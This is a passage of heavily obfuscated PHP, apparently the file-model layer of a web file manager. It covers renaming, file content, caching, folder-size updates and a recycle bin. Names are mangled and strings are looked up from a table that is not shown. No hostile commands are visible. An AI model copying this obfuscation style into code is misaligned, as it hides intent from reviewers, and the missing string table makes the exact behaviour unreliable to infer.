$Ûë¸êóƒ; } } else { $ÀŒÍ†Úò = array($³÷›»Ş[$¢­íËİ›[563]]); $Û¸‡óñ = array($Ûë¸êóƒ); } return array($¢­íËİ›[2443] => $Û¸‡óñ, $¢­íËİ›[1728] => $ÀŒÍ†Úò); } public function removeArray($£—ªÏëÇ) { if (!$£—ªÏëÇ) { return !0; } } public function removeRelevance($á‚œÓ¹É, $–Ñ…äæÉ) { $Û”‚…ñ =& $_SERVER[¤øïŠ‹²]; $á‚œÓ¹É = $á‚œÓ¹É ? $á‚œÓ¹É : array(); $–Ñ…äæÉ = $–Ñ…äæÉ ? $–Ñ…äæÉ : array(); $á‚œÓ¹É = array_unique(array_filter($á‚œÓ¹É)); $–Ñ…äæÉ = array_filter($–Ñ…äæÉ); if (!$á‚œÓ¹É) { return !1; } $¼æ¯•¦† = array($Û”‚…ñ[512] => array($Û”‚…ñ[513], $á‚œÓ¹É)); Model($Û”‚…ñ[2444])->where($¼æ¯•¦†)->delete(); Model($Û”‚…ñ[555])->where($¼æ¯•¦†)->delete(); Model($Û”‚…ñ[2277])->where($¼æ¯•¦†)->delete(); Model($Û”‚…ñ[662])->where($¼æ¯•¦†)->delete(); Model($Û”‚…ñ[1512])->removeBySource($á‚œÓ¹É); Model($Û”‚…ñ[2425])->removeBySource($á‚œÓ¹É); $this->where($¼æ¯•¦†)->delete(); Model($Û”‚…ñ[566])->remove($–Ñ…äæÉ); for ($‘ßá»©Ò = 0; $‘ßá»©Ò < count($á‚œÓ¹É); $‘ßá»©Ò++) { $this->sourceCacheClear($á‚œÓ¹É[$‘ßá»©Ò]); } } public function rename($ö›ˆšë”, $ò™àÖï) { $ŒÙã­ã =& $_SERVER[¤øïŠ‹²]; $ª¹€Û© = $this->sourceInfo($ö›ˆšë”); if (!$ª¹€Û©) { return !1; } $³ÆÀ‚ßè = $this->fileNameExist($ª¹€Û©[$ŒÙã­ã[203]], $ò™àÖï); if ($³ÆÀ‚ßè && $³ÆÀ‚ßè != $ö›ˆšë”) { return !1; } $èçÓ¹ûò = array($ŒÙã­ã[515] => $ò™àÖï, $ŒÙã­ã[680] => USER_ID); if ($ª¹€Û©[$ŒÙã­ã[506]] != $ŒÙã­ã[102]) { $èçÓ¹ûò[$ŒÙã­ã[507]] = substr(get_path_ext($ò™àÖï), 0, 10); } Model($ŒÙã­ã[662])->eventRename($ö›ˆšë”, $ª¹€Û©[$ŒÙã­ã[32]], $ò™àÖï); $this->sourceCacheClear($ö›ˆšë”); $this->setNamePinyin($ö›ˆšë”, $èçÓ¹ûò[$ŒÙã­ã[32]], !1); $this->updateModifyTime($ª¹€Û©[$ŒÙã­ã[203]]); $¸Œíß’¶ = $this->where(array($ŒÙã­ã[512] => $ö›ˆšë”))->data($èçÓ¹ûò)->save(); $ßŠ‚ªšú = $ŒÙã­ã[2433] . $ª¹€Û©[$ŒÙã­ã[203]]; if (isset(self::$cacheChildList[$ßŠ‚ªšú])) { unset(self::$cacheChildList[$ßŠ‚ªšú]); } return $¸Œíß’¶; } public function setNamePinyin($ïë„¶‰ª, $ˆĞ•×à¬, $™‡©İíˆ = true) { $¼ˆÏ‰ÌÌ =& $_SERVER[¤øïŠ‹²]; $ÌóØ‘Åô = Input::check($ˆĞ•×à¬, $¼ˆÏ‰ÌÌ[684]); $œÉáéÙÂ = array($¼ˆÏ‰ÌÌ[537] => KodSort::makeStr($ˆĞ•×à¬)); if ($ÌóØ‘Åô) { $œÉáéÙÂ[$¼ˆÏ‰ÌÌ[558]] = str_replace($¼ˆÏ‰ÌÌ[53], $¼ˆÏ‰ÌÌ[12], Pinyin::get($ˆĞ•×à¬)); $œÉáéÙÂ[$¼ˆÏ‰ÌÌ[557]] = Pinyin::get($ˆĞ•×à¬, $¼ˆÏ‰ÌÌ[685]); } if (!$™‡©İíˆ && !$ÌóØ‘Åô) { $œÉáéÙÂ[$¼ˆÏ‰ÌÌ[558]] = null; $œÉáéÙÂ[$¼ˆÏ‰ÌÌ[557]] = null; } $this->metaSet($ïë„¶‰ª, $œÉáéÙÂ); } public function getContent($™²èöö) { $Ô¬ä†òÀ =& $_SERVER[¤øïŠ‹²]; $²¿§Ïç¨ = $this->fileInfoGet($™²èöö); if (!$²¿§Ïç¨) { return !1; } if ($²¿§Ïç¨[$Ô¬ä†òÀ[90]] == 0) { return $Ô¬ä†òÀ[12]; } $Öë‚ñ‚á = $Ô¬ä†òÀ[2448] . $²¿§Ïç¨[$Ô¬ä†òÀ[569]]; if ($²¿§Ïç¨[$Ô¬ä†òÀ[90]] <= 1024 * 10) { $¼Îü¤ë§ = Cache::get($Öë‚ñ‚á); if (!$¼Îü¤ë§) { $¼Îü¤ë§ = IO::getContent($²¿§Ïç¨[$Ô¬ä†òÀ[98]]); Cache::set($Öë‚ñ‚á, $¼Îü¤ë§); } return $¼Îü¤ë§; } if (!$²¿§Ïç¨[$Ô¬ä†òÀ[98]]) { return $Ô¬ä†òÀ[12]; } return IO::getContent($²¿§Ïç¨[$Ô¬ä†òÀ[98]]); } public function setDesc($˜¿ÆğÜÛ, $’ûîŞ) { $ç£§´ =& $_SERVER[¤øïŠ‹²]; Model($ç£§´[662])->eventAddDesc($˜¿ÆğÜÛ, $’ûîŞ); return $this->metaSet($˜¿ÆğÜÛ, $ç£§´[546], $’ûîŞ); } public function setContent($À¿íÄå, $••ÚĞ˜‡ = '') { $¯¡Ğ¹‘¼ =& $_SERVER[¤øïŠ‹²]; $ €Ïış× = $this->sourceInfo($À¿íÄå); $³ï¶‡€› = $this->fileInfoGet($À¿íÄå); if (!$³ï¶‡€› || !$ €Ïış×) { return !1; } $¡Ü¥¾¶ı = KodIO::ioFileDriverGet($¯¡Ğ¹‘¼[504] . $À¿íÄå . $¯¡Ğ¹‘¼[414]); $ó±àîâ´ = Model($¯¡Ğ¹‘¼[566])->addFileByContent($••ÚĞ˜‡, $¡Ü¥¾¶ı, $ €Ïış×[$¯¡Ğ¹‘¼[32]]); if (!$ó±àîâ´) { return !1; } $ËÊŠòİñ = $this->fileHistory($ €Ïış×, $ó±àîâ´[$¯¡Ğ¹‘¼[563]], $ó±àîâ´[$¯¡Ğ¹‘¼[90]]); if (!$ËÊŠòİñ) { return Model($¯¡Ğ¹‘¼[566])->remove($ó±àîâ´[$¯¡Ğ¹‘¼[563]]); } $this->folderSizeReset($ €Ïış×[$¯¡Ğ¹‘¼[203]]); return !0; } public function fileSubstr($ù¿úáÄ, $å™Ë¬ç, $Á²şáÚ») { $Æ©¹»ò = $this->fileInfoGet($ù¿úáÄ); if (!$Æ©¹»ò) { return !1; } return IO::fileSubstr($Æ©¹»ò[$_SERVER[¤øïŠ‹²][98]], $å™Ë¬ç, $Á²şáÚ»); } public function fileInfoGet($ùÀ¢Æ) { $Ò´ÓØçé =& $_SERVER[¤øïŠ‹²]; $ ›Ô×œò = $this->sourceInfo($ùÀ¢Æ); if (!$ ›Ô×œò || $ ›Ô×œò[$Ò´ÓØçé[506]]) { return !1; } $Á´Ùªø = $Ò´ÓØçé[570] . $ ›Ô×œò[$Ò´ÓØçé[563]]; $¡ØòØìƒ = _get(self::$cacheFileInfo, $Á´Ùªø); if ($¡ØòØìƒ) { return $¡ØòØìƒ; } $”Œ“´ßú = Model($Ò´ÓØçé[566])->fileInfo($ ›Ô×œò[$Ò´ÓØçé[563]]); if ($”Œ“´ßú) { $”Œ“´ßú[$Ò´ÓØçé[32]] = $ ›Ô×œò[$Ò´ÓØçé[32]]; } self::$cacheFileInfo[$Á´Ùªø] = $”Œ“´ßú; return $”Œ“´ßú; } private function folderChildrenNumber($«ò–üäĞ) { $šµôò¿„ =& $_SERVER[¤øïŠ‹²]; $¾‡àşŠ§ = $this->sourceInfo($«ò–üäĞ); $·˜ô’®Í = array($šµôò¿„[681] => array($šµôò¿„[641], $¾‡àşŠ§[$šµôò¿„[610]] . $«ò–üäĞ . $šµôò¿„[642]), $šµôò¿„[678] => $¾‡àşŠ§[$šµôò¿„[595]], $šµôò¿„[525] => intval($¾‡àşŠ§[$šµôò¿„[526]]), $šµôò¿„[675] => 1); $ÃáŸÓÅÈ = $this->where($·˜ô’®Í)->count(); $•éÎ«™ô = $this->where($·˜ô’®Í)->where(array($šµôò¿„[675] => 0))->count(); return array($šµôò¿„[94] => $•éÎ«™ô, $šµôò¿„[95] => $ÃáŸÓÅÈ); } public function pathInfo($¬´óæÓ, $€Ÿ¯ÍÍ = false) { $±«úšŒù =& $_SERVER[¤øïŠ‹²]; $€Ÿ¯ÍÍ = !1; $¬´óæÓ = intval($¬´óæÓ); if (!$¬´óæÓ) { return !1; } $İ¾İé½Û = $±«úšŒù[554] . intval($€Ÿ¯ÍÍ) . $±«úšŒù[483] . $¬´óæÓ; $ÛÅ‡Û¸€ = _get(self::$cachePathInfo, $İ¾İé½Û); if ($ÛÅ‡Û¸€) { return $ÛÅ‡Û¸€; } $¼¥–ì†ª = $this->sourceInfo($¬´óæÓ); if (!$¼¥–ì†ª) { return !1; } $¼¥–ì†ª = $this->_listDataApplyItem($¼¥–ì†ª, $€Ÿ¯ÍÍ); self::$cachePathInfo[$İ¾İé½Û] = $¼¥–ì†ª; return $¼¥–ì†ª; } public static $cachePathInfoMore = array(); public function pathInfoMore($ÑãÀ°¾) { $“ğÍîê® =& $_SERVER[¤øïŠ‹²]; $øÓ¼µèƒ = _get(self::$cachePathInfoMore, $ÑãÀ°¾); if ($øÓ¼µèƒ) { return $øÓ¼µèƒ; } $˜ÏŸèÁ± = $this->pathInfo($ÑãÀ°¾); if (!$˜ÏŸèÁ±) { return !1; } if ($˜ÏŸèÁ±[$“ğÍîê®[506]] == $“ğÍîê®[102]) { $˜ÏŸèÁ±[$“ğÍîê®[93]] = $this->folderChildrenNumber($ÑãÀ°¾); } self::$cachePathInfoMore[$ÑãÀ°¾] = $˜ÏŸèÁ±; return $˜ÏŸèÁ±; } public function sourceInfo($ÁİÖşß) { $ÀûØõ­¯ =& $_SERVER[¤øïŠ‹²]; if (!$ÁİÖşß) { return array(); } $ÁİÖşß = intval($ÁİÖşß); $×òò·”Í = $ÀûØõ­¯[553] . $ÁİÖşß; $ÑåŒóïÖ = _get(self::$cacheSourceInfo, $×òò·”Í); if ($ÑåŒóïÖ) { return $ÑåŒóïÖ; } $âŞƒÖì‰ = $this->where(array($ÀûØõ­¯[204] => $ÁİÖşß))->find(); self::$cacheSourceInfo[$×òò·”Í] = $âŞƒÖì‰; return self::$cacheSourceInfo[$×òò·”Í]; } public function sourceCacheClear($œè÷Ğ†© = false) { self::cacheClear($œè÷Ğ†©); } public static function cacheClear($¡áôùØš = false) { $Ø«º±—ö =& $_SERVER[¤øïŠ‹²]; if ($¡áôùØš == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$Ø«º±—ö[553] . $¡áôùØš]); unset(self::$cachePathInfoMore[$¡áôùØš]); unset(self::$cachePathInfo[$Ø«º±—ö[2449] . $¡áôùØš]); unset(self::$cachePathInfo[$Ø«º±—ö[2450] . $¡áôùØš]); } public function metaSet($ªƒä÷Ã, $éâ‰¾Ã› = null, $ìËîõúı = null) { $ñÜóÁÙì = parent::metaSet($ªƒä÷Ã, $éâ‰¾Ã›, $ìËîõúı); if ($ñÜóÁÙì) { $this->sourceCacheClear($ªƒä÷Ã); } return $ñÜóÁÙì; } public function pathInfoByPath($”ëª Èú, $©¨ÈÔ) { $²¢ì¹®Ë =& $_SERVER[¤øïŠ‹²]; $ÕÏşÍ¿ = !$©¨ÈÔ ? array() : explode($²¢ì¹®Ë[8], trim($©¨ÈÔ, $²¢ì¹®Ë[8])); $†ŞåµŞÏ = intval($”ëª Èú); foreach ($ÕÏşÍ¿ as $ÓŠø‰Æ•) { $¼õ•‚Èä = array($²¢ì¹®Ë[203] => $†ŞåµŞÏ, $²¢ì¹®Ë[32] => $ÓŠø‰Æ•); $‘Ë¬Æ¾³ = $this->field($²¢ì¹®Ë[2451])->where($¼õ•‚Èä)->select(); if (!$‘Ë¬Æ¾³) { return !1; } $‘Ë¬Æ¾³ = array_sort_by($‘Ë¬Æ¾³, $²¢ì¹®Ë[526]); $†ŞåµŞÏ = intval($‘Ë¬Æ¾³[0][$²¢ì¹®Ë[204]]); } $§‚ïÇ« = $this->sourceInfo($†ŞåµŞÏ); $this->pathInfoFilter($§‚ïÇ«); return $§‚ïÇ«; } protected function updateModifyTime($ÛÂ¨ÏĞÄ) { $‘ûãÃ‡¨ =& $_SERVER[¤øïŠ‹²]; $ÕöÆøØÏ = KodUser::id(); if (!$ÛÂ¨ÏĞÄ) { return; } if (!is_array($ÛÂ¨ÏĞÄ)) { $ÛÂ¨ÏĞÄ = array($ÛÂ¨ÏĞÄ); } foreach ($ÛÂ¨ÏĞÄ as $„Ëõ•Á => $Û®¥Öô‰) { $ÛÂ¨ÏĞÄ[$„Ëõ•Á] = intval($Û®¥Öô‰); $this->sourceCacheClear($Û®¥Öô‰); } $¥®‚…–İ = array($‘ûãÃ‡¨[204] => array($‘ûãÃ‡¨[7], $ÛÂ¨ÏĞÄ)); $ïûğòœñ = array($‘ûãÃ‡¨[680] => $ÕöÆøØÏ, $‘ûãÃ‡¨[519] => time()); $this->where($¥®‚…–İ)->save($ïûğòœñ); } public function folderSizeReset($Ó³û¸üÆ, $Ù—áÛ ç = false) { $ê«ù­å =& $_SERVER[¤øïŠ‹²]; if ($this->statusIgnoreResetSpace) { return; } if (!$Ó³û¸üÆ) { return; } $ÄğÑığµ = $this->sourceInfo($Ó³û¸üÆ); $òê¬ğ–Ì = $ê«ù­å[2452] . $Ó³û¸üÆ; if (!$ÄğÑığµ || !$ÄğÑığµ[$ê«ù­å[204]]) { return; } CacheLock::lock($òê¬ğ–Ì, 20); if ($Ù—áÛ ç === !1) { $this->sourceCacheClear($Ó³û¸üÆ); $ÄğÑığµ = $this->sourceInfo($Ó³û¸üÆ); $Ö•ëÃ› = array($ê«ù­å[498] => $Ó³û¸üÆ, $ê«ù­å[525] => 0); $ß­§’û‘ = $this->where($Ö•ëÃ›)->sum($ê«ù­å[90]); $Ù—áÛ ç = intval($ß­§’û‘) - intval($ÄğÑığµ[$ê«ù­å[90]]); } if ($Ù—áÛ ç == 0) { return CacheLock::unlock($òê¬ğ–Ì); } $ÍÛ°Ìº = $this->parentLevelArray($ÄğÑığµ[$ê«ù­å[610]]); if (!$ÍÛ°Ìº) { $ÍÛ°Ìº = array(); } $ÍÛ°Ìº[] = $ÄğÑığµ[$ê«ù­å[204]]; $Ö•ëÃ› = array($ê«ù­å[204] => array($ê«ù­å[513], $ÍÛ°Ìº)); if ($Ù—áÛ ç < 0) { $Ö•ëÃ›[$ê«ù­å[90]] = array($ê«ù­å[1131], abs($Ù—áÛ ç)); } $this->where($Ö•ëÃ›)->setAdd($ê«ù­å[90], $Ù—áÛ ç); CacheLock::unlock($òê¬ğ–Ì); if (!$ÄğÑığµ[$ê«ù­å[595]] || $ÄğÑığµ[$ê«ù­å[595]] == $ê«ù­å[241]) { return; } $É·“¢Œ¡ = $ê«ù­å[2453] . $ÄğÑığµ[$ê«ù­å[201]] . $ê«ù­å[4] . $ÄğÑığµ[$ê«ù­å[595]]; $áÊû¾¬ = array($ÄğÑığµ[$ê«ù­å[201]], $ÄğÑığµ[$ê«ù­å[595]]); TaskRun::timeLimitCall($É·“¢Œ¡, $ê«ù­å[2454], $áÊû¾¬, 1.5); } public function folderSizeResetChildren($–ÁùüÂñ) { $³­½ôß’ =& $_SERVER[¤øïŠ‹²]; $this->sourceCacheClear($–ÁùüÂñ); $°ÙèÏğ = $this->sourceInfo($–ÁùüÂñ); if (!$°ÙèÏğ) { return; } $À’ƒ¼•İ = array($³­½ôß’[675] => 1, $³­½ôß’[678] => $°ÙèÏğ[$³­½ôß’[595]], $³­½ôß’[681] => array($³­½ôß’[641], $°ÙèÏğ[$³­½ôß’[610]] . $–ÁùüÂñ . $³­½ôß’[642])); $™ê«ğüÜ = $³­½ôß’[2455]; $Ù©È—‹æ = $this->field($™ê«ğüÜ)->where($À’ƒ¼•İ)->select(); $À’ƒ¼•İ[$³­½ôß’[506]] = 0; $¿éÜÃ·ò = $this->field($™ê«ğüÜ)->where($À’ƒ¼•İ)->select(); if (!$¿éÜÃ·ò) { return; } $Ù©È—‹æ[] = $°ÙèÏğ; $Ù©È—‹æ = array_to_keyvalue($Ù©È—‹æ, $³­½ôß’[204]); foreach ($Ù©È—‹æ as $¼Ÿ®à´ => $×œËŠßà) { $Ù©È—‹æ[$¼Ÿ®à´][$³­½ôß’[2456]] = $Ù©È—‹æ[$¼Ÿ®à´][$³­½ôß’[90]]; $Ù©È—‹æ[$¼Ÿ®à´][$³­½ôß’[90]] = 0; } foreach ($¿éÜÃ·ò as $×œËŠßà) { $ªÃ™—• = $×œËŠßà[$³­½ôß’[203]] . $³­½ôß’[12]; if (!isset($Ù©È—‹æ[$ªÃ™—•])) { continue; } if ($×œËŠßà[$³­½ôß’[526]] == $Ù©È—‹æ[$ªÃ™—•][$³­½ôß’[526]]) { $Ù©È—‹æ[$ªÃ™—•][$³­½ôß’[90]] += $×œËŠßà[$³­½ôß’[90]]; } } foreach ($Ù©È—‹æ as $×œËŠßà) { $„Óíò×ü = $this->parentLevelArray($×œËŠßà[$³­½ôß’[610]]); foreach ($„Óíò×ü as $ªÃ™—•) { $ªÃ™—• = $ªÃ™—• . $³­½ôß’[12]; if (!isset($Ù©È—‹æ[$ªÃ™—•])) { continue; } if ($×œËŠßà[$³­½ôß’[526]] == $Ù©È—‹æ[$ªÃ™—•][$³­½ôß’[526]]) { $Ù©È—‹æ[$ªÃ™—•][$³­½ôß’[90]] += $×œËŠßà[$³­½ôß’[90]]; } } } $Ó§§ƒà¥ = array(); foreach ($Ù©È—‹æ as $×œËŠßà) { if ($×œËŠßà[$³­½ôß’[90]] == $×œËŠßà[$³­½ôß’[2456]]) { continue; } $Ó§§ƒà¥[] = array($³­½ôß’[204], $×œËŠßà[$³­½ôß’[204]], $³­½ôß’[90], $×œËŠßà[$³­½ôß’[90]]); } $this->saveAll($Ó§§ƒà¥); } public function userSpaceReset($Ã„ô÷ãÂ = false) { $€˜ßº“ =& $_SERVER[¤øïŠ‹²]; $›Çê«Øƒ = $this->where(array($€˜ßº“[201] => self::TYPE_USER, $€˜ßº“[595] => $Ã„ô÷ãÂ, $€˜ßº“[506] => 0))->sum($€˜ßº“[90]); $›Çê«Øƒ = !$›Çê«Øƒ || $›Çê«Øƒ <= 0 ? 0 : $›Çê«Øƒ; Model($€˜ßº“[603])->userEdit($Ã„ô÷ãÂ, array($€˜ßº“[2120] => $›Çê«Øƒ)); } public function targetSpaceUpdate($“ÖÒÁé, $«ÇŸíŒÃ) { $•Í—ì¦ç =& $_SERVER[¤øïŠ‹²]; if (!$«ÇŸíŒÃ) { return; } if (!in_array($“ÖÒÁé, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $Ï§Ê‰…î = $this->targetSpaceSize($“ÖÒÁé, $«ÇŸíŒÃ); if ($“ÖÒÁé == self::TYPE_USER) { Model($•Í—ì¦ç[603])->userEdit($«ÇŸíŒÃ, array($•Í—ì¦ç[2120] => $Ï§Ê‰…î)); } else { if ($“ÖÒÁé == self::TYPE_GROUP) { Model($•Í—ì¦ç[611])->groupEdit($«ÇŸíŒÃ, array($•Í—ì¦ç[2120] => $Ï§Ê‰…î)); } } } public function targetSpaceSize($Ó”îÄèê, $ş·¯ËüÑ) { $øö£Ù±û =& $_SERVER[¤øïŠ‹²]; $”¸äÕóÀ = 0; $Å˜¯î³ = $this->targetSourceRoot($Ó”îÄèê, $ş·¯ËüÑ, !0); foreach ($Å˜¯î³ as $é¬ €éÖ) { if (!$é¬ €éÖ) { continue; } $”¸äÕóÀ += floatval($é¬ €éÖ[$øö£Ù±û[90]]); $¢ğÛõ™ı = array($øö£Ù±û[681] => array($øö£Ù±û[641], $øö£Ù±û[619] . $é¬ €éÖ[$øö£Ù±û[204]] . $øö£Ù±û[642])); $ÇúÁ÷Áç = Model($øö£Ù±û[524])->field($øö£Ù±û[512])->where($¢ğÛõ™ı)->select(); $ÇúÁ÷Áç = array_to_keyvalue($ÇúÁ÷Áç, $øö£Ù±û[12], $øö£Ù±û[204]); $ÇúÁ÷Áç = array_unique(array_filter($ÇúÁ÷Áç)); if ($ÇúÁ÷Áç) { $¢ğÛõ™ı = array($øö£Ù±û[512] => array($øö£Ù±û[513], $ÇúÁ÷Áç)); $”¸äÕóÀ += floatval($this->where($¢ğÛõ™ı)->sum($øö£Ù±û[90])); } } $”¸äÕóÀ = !$”¸äÕóÀ || $”¸äÕóÀ <= 0 ? 0 : $”¸äÕóÀ; return $”¸äÕóÀ; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($œíÄÒ¢¡) { return $this->fileTypeProfile($œíÄÒ¢¡, SourceModel::TYPE_USER); } public function groupFileTypeProfile($şìä¿·›) { return $this->fileTypeProfile($şìä¿·›, SourceModel::TYPE_GROUP); } private function fileTypeProfile($»Š¸åº¦, $°Æç‹²) { $ó´æ— =& $_SERVER[¤øïŠ‹²]; $¡÷­¤†Ã = $ó´æ—[2457] . $»Š¸åº¦ . $ó´æ—[11] . $°Æç‹²; $×ÄÆÀÂ² = Cache::get($¡÷­¤†Ã); if ($×ÄÆÀÂ²) { return $×ÄÆÀÂ²; } $•Òƒ¡€ = array($ó´æ—[675] => 0); if ($»Š¸åº¦ != !1) { $•Òƒ¡€[$ó´æ—[595]] = $»Š¸åº¦; $•Òƒ¡€[$ó´æ—[201]] = $°Æç‹²; } $¶“äÕøœ = array(); $Ü–ÙÛèÃ = $this->field(array($ó´æ—[2382] => $ó´æ—[2087], $ó´æ—[2458] => $ó´æ—[90]))->where($•Òƒ¡€)->find(); $¶“äÕøœ[$ó´æ—[2459]] = array($ó´æ—[2460] => LNG($ó´æ—[2459]), $ó´æ—[2461] => intval($Ü–ÙÛèÃ[$ó´æ—[2087]]), $ó´æ—[646] => intval($Ü–ÙÛèÃ[$ó´æ—[90]])); $‡¼¤´µô = KodIO::fileTypeList(); foreach ($‡¼¤´µô as $¦Ñ´şİÁ => $È‚µ·) { $•Òƒ¡€[$ó´æ—[507]] = $this->fileTypeWhere($¦Ñ´şİÁ); $Ü–ÙÛèÃ = $this->field(array($ó´æ—[2382] => $ó´æ—[2087], $ó´æ—[2458] => $ó´æ—[90]))->where($•Òƒ¡€)->find(); $¶“äÕøœ[$¦Ñ´şİÁ] = array($ó´æ—[2460] => $È‚µ·[$ó´æ—[32]], $ó´æ—[2461] => intval($Ü–ÙÛèÃ[$ó´æ—[2087]]), $ó´æ—[646] => intval($Ü–ÙÛèÃ[$ó´æ—[90]])); } Cache::set($¡÷­¤†Ã, $¶“äÕøœ, 1200); return $¶“äÕøœ; } public function fileNameExist($ğì„öİ›, $ŠŠî´Ò©) { $Î«¾‚ËÀ =& $_SERVER[¤øïŠ‹²]; $¢¸¬Çùœ = $this->field($Î«¾‚ËÀ[2462])->where(array($Î«¾‚ËÀ[203] => $ğì„öİ›, $Î«¾‚ËÀ[32] => $ŠŠî´Ò©, $Î«¾‚ËÀ[526] => 0))->find(); return is_array($¢¸¬Çùœ) ? $¢¸¬Çùœ[$Î«¾‚ËÀ[204]] : !1; } public function childList($ë«„•) { $…¨Û«Ş =& $_SERVER[¤øïŠ‹²]; $¤äì™®• = $…¨Û«Ş[2433] . $ë«„•; if (isset(self::$cacheChildList[$¤äì™®•])) { return self::$cacheChildList[$¤äì™®•]; } $ˆî­†¤¥ = array($…¨Û«Ş[203] => intval($ë«„•), $…¨Û«Ş[526] => 0); $¼€û¨ÜÌ = $this->where($ˆî­†¤¥)->select(); $¼€û¨ÜÌ = $¼€û¨ÜÌ ? $¼€û¨ÜÌ : array(); self::$cacheChildList[$¤äì™®•] = $¼€û¨ÜÌ; foreach ($¼€û¨ÜÌ as $§¬²¸ïò) { $¤äì™®• = $…¨Û«Ş[553] . $§¬²¸ïò[$…¨Û«Ş[204]]; self::$cacheSourceInfo[$¤äì™®•] = $§¬²¸ïò; } return $¼€û¨ÜÌ; } public function fileNameAuto($¡å‡€Ê, $Á ë•…Ì, $ßÉîÛ½ş = REPEAT_RENAME, $úÅ…¼± = false) { $¬‡ş©™© =& $_SERVER[¤øïŠ‹²]; $®ƒ›ª¨Ã = get_path_ext($Á ë•…Ì); $œ ÂÃ§ = $®ƒ›ª¨Ã ? get_path_ext_name($Á ë•…Ì) . $¬‡ş©™©[2463] . $®ƒ›ª¨Ã : $Á ë•…Ì . $¬‡ş©™©[481]; $Ô¯Ìº· = array($¬‡ş©™©[203] => $¡å‡€Ê, $¬‡ş©™©[526] => 0, $¬‡ş©™©[32] => array($¬‡ş©™©[480], $œ ÂÃ§)); $Ü¬õ…Š® = $this->field($¬‡ş©™©[32])->where($Ô¯Ìº·)->select(); $ôŞÊ ± = array_to_keyvalue($Ü¬õ…Š®, $¬‡ş©™©[12], $¬‡ş©™©[32]); return $this->fileNameAutoGet($ôŞÊ ±, $Á ë•…Ì, $ßÉîÛ½ş, $úÅ…¼±); } public function fileNameAutoGet($ŞÜŠ‰Ø­, $ìùÕÚ, $á˜Ó‚ô, $Ãº²ğº) { $ƒ›·Üã” =& $_SERVER[¤øïŠ‹²]; if ($á˜Ó‚ô == REPEAT_REPLACE || !$ŞÜŠ‰Ø­ || !in_array_not_case($ìùÕÚ, $ŞÜŠ‰Ø­) || $Ãº²ğº && $á˜Ó‚ô != REPEAT_RENAME_FOLDER) { return $ìùÕÚ; } if ($á˜Ó‚ô == REPEAT_SKIP) { return !1; } $ª’ÄÃ¦€ = $ƒ›·Üã”[10] . get_path_ext($ìùÕÚ); $ª’ÄÃ¦€ = $ª’ÄÃ¦€ == $ƒ›·Üã”[10] || $Ãº²ğº ? $ƒ›·Üã”[12] : $ª’ÄÃ¦€; for ($‰¼¬Üóè = 1; $‰¼¬Üóè <= count($ŞÜŠ‰Ø­) + 1; $‰¼¬Üóè++) { $ªª½€¸à = substr($ìùÕÚ, 0, strlen($ìùÕÚ) - strlen($ª’ÄÃ¦€)); $ëÜïÇê = $ªª½€¸à . "\50{$‰¼¬Üóè}\51{$ª’ÄÃ¦€}"; if (!in_array_not_case($ëÜïÇê, $ŞÜŠ‰Ø­)) { return $ëÜïÇê; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\x6f\165\162\x63\145\137\x72\145\x63\171\143\x6c\145"; protected $dataAuto = array(array("\143\x72\145\141\x74\x65\x54\151\x6d\145", "\164\x69\155\x65", "\x69\x6e\163\x65\162\x74", "\146\x75\156\x63\164\x69\157\x6e")); public function listData($íùÙ©ñ× = false) { $°‹…è‹À =& $_SERVER[¤øïŠ‹²]; $íùÙ©ñ× = $íùÙ©ñ× ? $íùÙ©ñ× : USER_ID; $‡é´»× = $this->where(array($°‹…è‹À[1916] => $íùÙ©ñ×))->select(); return array_to_keyvalue($‡é´»×, $°‹…è‹À[12], $°‹…è‹À[204]); } public function moveToRecycle($µ¤¬) { $Ç³µ¢–“ =& $_SERVER[¤øïŠ‹²]; $ŠŒ¬¼ğË = Model($Ç³µ¢–“[1482]); $ìÜš¼— = $ŠŒ¬¼ğË->sourceInfo($µ¤¬); if (!$ìÜš¼— || $ìÜš¼—[$Ç³µ¢–“[526]] == $Ç³µ¢–“[102]) { return; } $‹ªÔéô = array($Ç³µ¢–“[512] => $µ¤¬, $Ç³µ¢–“[1916] => USER_ID, $Ç³µ¢–“[677] => $ìÜš¼—[$Ç³µ¢–“[201]], $Ç³µ¢–“[678] => $ìÜš¼—[$Ç³µ¢–“[595]], $Ç³µ¢–“[681] => $ìÜš¼—[$Ç³µ¢–“[610]]); $this->add($‹ªÔéô); $this->recycleMove($µ¤¬, 1); if ($ìÜš¼—[$Ç³µ¢–“[506]] == $Ç³µ¢–“[102]) { $ààİñª† = array($Ç³µ¢–“[681] => array($Ç³µ¢–“[641], $ìÜš¼—[$Ç³µ¢–“[610]] . $µ¤¬ . $Ç³µ¢–“[642])); $ŠŒ¬¼ğË->where($ààİñª†)->setField($Ç³µ¢–“[526], 1); } } public function clear() { $this->remove(!1); } public function remove($«ÁîÚ…ô = false, $µÃ‚È»» = false) { $­ñÁà¸² =& $_SERVER[¤øïŠ‹²]; $µÃ‚È»» = $µÃ‚È»» ? $µÃ‚È»» : USER_ID; $Ü§ù–ö = Model($­ñÁà¸²[1482]); $¨ßüûæ¬ = $this->listData($µÃ‚È»»); $«ÁîÚ…ô = $«ÁîÚ…ô === !1 ? !1 : $«ÁîÚ…ô; $ÉŒå»¤Ø = array(); foreach ($¨ßüûæ¬ as $ËÊ©®ÏØ) { if ($«ÁîÚ…ô != !1 && !in_array($ËÊ©®ÏØ, $«ÁîÚ…ô)) { continue; } $ã¤Õ‡è = $Ü§ù–ö->sourceInfo($ËÊ©®ÏØ); $Ü§ù–ö->remove($ËÊ©®ÏØ, !1); $ö­ÍåéÙ = $ã¤Õ‡è[$­ñÁà¸²[201]] . $­ñÁà¸²[11] . $ã¤Õ‡è[$­ñÁà¸²[595]]; $ÉŒå»¤Ø[$ö­ÍåéÙ] = array($­ñÁà¸²[677] => $ã¤Õ‡è[$­ñÁà¸²[201]], $­ñÁà¸²[595] => $ã¤Õ‡è[$­ñÁà¸²[595]]); $this->where(array($­ñÁà¸²[204] => $ËÊ©®ÏØ))->delete(); } foreach ($ÉŒå»¤Ø as $ºÁƒÀ¤¡) { $Ü§ù–ö->targetSpaceUpdate($ºÁƒÀ¤¡[$­ñÁà¸²[201]], $ºÁƒÀ¤¡[$­ñÁà¸²[595]]); } } public 